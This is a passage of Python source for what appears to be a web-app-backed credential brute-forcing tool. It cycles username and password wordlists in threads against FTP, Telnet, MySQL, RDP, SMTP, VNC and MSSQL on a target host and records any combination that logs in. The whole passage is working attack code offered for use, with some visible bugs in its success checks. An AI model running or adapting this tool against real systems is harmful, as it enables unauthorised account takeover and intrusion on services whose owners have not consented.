                        failed_attempts_per_service[service_name] += 1
                        ftp_attempts += 1
                        if ftp_attempts >= max_attempts:
                            print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
                            stop_flag_per_service[service_name] = True
                            break

                if ftp_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True 

            elif service_name == 'Telnet':
                telnet_attempts = 0
                while telnet_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        with telnetlib.Telnet(target, port, timeout=10) as telnet:
                            telnet = telnetlib.Telnet(target, port)
                            telnet.read_until(b"login: ")
                            telnet.write(username.encode('ascii') + b"\n")
                            telnet.read_until(b"Password: ")
                            telnet.write(password.encode('ascii') + b"\n")
                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                            stop_flag_per_service[service_name] = True
                            telnet.close()
                            break
                    except EOFError:
                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
                        failed_attempts_per_service[service_name] += 1
                        telnet_attempts += 1
                        
                    except socket.timeout as e:
                        # Maneja errores de tiempo de espera explícitamente
                        print(termcolor.colored(f"[-] Telnet Connection Timed Out: {e}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        telnet_attempts += 1
                        time.sleep(2)
                    
                    except Exception as e:
                        print(termcolor.colored(f"[-] Telnet Connection Failed: {e}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        telnet_attempts += 1
                        if telnet_attempts >= max_attempts:  # Si alcanzamos el máximo de intentos fallidos, salimos
                            print(termcolor.colored(f"[-] Max password attempts reached for Telnet on {target}:{port}", 'red'))
                            stop_flag_per_service[service_name] = True
                            break

                if telnet_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for Telnet on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True

            elif service_name == 'MySQL':
                mysql_attempts = 0
                while mysql_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        db = mysql.connector.connect(
                            host=target,
                            user=username,
                            password=password,
                            port=port,
                            connect_timeout=5
                        )
                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                        stop_flag_per_service[service_name] = True
                        db.close()
                        break
                    except mysql.connector.Error as e:
                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        mysql_attempts += 1
                        
                    except mysql.connector.errors.InterfaceError as e:
                        if "timed out" in str(e):
                            print(termcolor.colored(f"[-] MySQL Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        mysql_attempts += 1
                        time.sleep(2)  # Espera antes del próximo intento

                if mysql_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for MySQL on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True
                
            elif service_name == 'RDP':
                rdp_attempts = 0
                try:
                    # Intentos limitados para RDP
                    while rdp_attempts < max_attempts and not stop_flag_per_service[service_name]:
                        command = f"xfreerdp /u:{username} /p:{password} /v:{target}:{port} +auth-only"
                        rdp_result = subprocess.run(command, shell=True, capture_output=True, text=True)

                        if rdp_result.returncode == 0:
                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                            stop_flag_per_service[service_name] = True
                            break
                        else:
                            # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
                            failed_attempts_per_service[service_name] += 1
                            rdp_attempts += 1

                    if rdp_attempts >= max_attempts:
                        print(termcolor.colored(f"[-] Max password attempts reached for RDP on {target}:{port}", 'red'))
                        stop_flag_per_service[service_name] = True

                except Exception as e:
                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
                    print(termcolor.colored(f"[-] RDP Connection Failed: {e}", 'red'))
                    
                except subprocess.TimeoutExpired:
                        print(termcolor.colored(f"[-] RDP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        rdp_attempts += 1
                        time.sleep(2)
                    
            elif service_name == 'SMTP':
                smtp_attempts = 0
                while smtp_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        smtp_server = smtplib.SMTP(target, port)
                        smtp_server.starttls()
                        smtp_server.login(username, password)
                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                        stop_flag_per_service[service_name] = True
                        smtp_server.quit()
                        break
                    except socket.timeout:
                        print(termcolor.colored(f"[-] SMTP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        smtp_attempts += 1
                        time.sleep(2)
                    except Exception as e:
                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        smtp_attempts += 1

                if smtp_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for SMTP on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True
                    
            if service_name == 'VNC':
                vnc_attempts = 0
                while vnc_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        vnc = api.connect(f"{target}:{port}")
                        vnc.keyPress('password')
                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                        stop_flag_per_service[service_name] = True
                        vnc.disconnect()
                        break
                    except socket.timeout:
                        print(termcolor.colored(f"[-] VNC Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        vnc_attempts += 1
                        time.sleep(2)
                    except Exception as e:
                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        vnc_attempts += 1

                if vnc_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for VNC on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True
            
            elif service_name == 'MSSQL':
                mssql_attempts = 0
                while mssql_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        mssql = pymssql.connect(server=target, port=port, user=username, password=password, timeout=5)
                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                        stop_flag_per_service[service_name] = True
                        mssql.close()
                        break
                    except pymssql.InterfaceError as e:
                        if "timed out" in str(e):
                            print(termcolor.colored(f"[-] MSSQL Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        mssql_attempts += 1
                        time.sleep(2)
                    except Exception as e:
                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                        failed_attempts_per_service[service_name] += 1
                        mssql_attempts += 1

                if mssql_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for MSSQL on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True

        except (paramiko.ssh_exception.AuthenticationException, ftplib.error_perm, mysql.connector.errors.ProgrammingError):
            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
            failed_attempts_per_service[service_name] += 1
        
        except Exception as e:
            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
            failed_attempts_per_service[service_name] += 1

        finally:
            if result is not None and result['status'] == 'success':
                brute_force_results.append(result)
            thread_limiter.release()

    usernames_file = "usernamesReal.txt"
    passwords_file = "passwordsReal.txt"
    print('\n')

    if not os.path.exists(passwords_file):
        print('[!!] That File/Path Doesn\'t Exist')
        sys.exit(1)

    print('Starting Force Brute in host ' + target)

    for service_name, port in ports_to_test.items():
        stop_flag_per_service[service_name] = False
        failed_attempts_per_service[service_name] = 0
        print(f'\nStarting Force Brute in service {service_name} on port {port}')
        
        with open(usernames_file, 'r') as users:
            for username in users:
                username = username.strip()
                with open(passwords_file, 'r') as passwords:
                    for password in passwords:
                        password = password.strip()
                        if stop_flag_per_service[service_name]:
                            break
                        thread_limiter.acquire()
                        t = threading.Thread(target=service_connect, args=(service_name, username, password, port))
                        t.start()
                        time.sleep(0.5)
                if stop_flag_per_service[service_name]:
                    break
            
    return brute_force_results

if __name__ == '__main__':
    app.run(debug=True)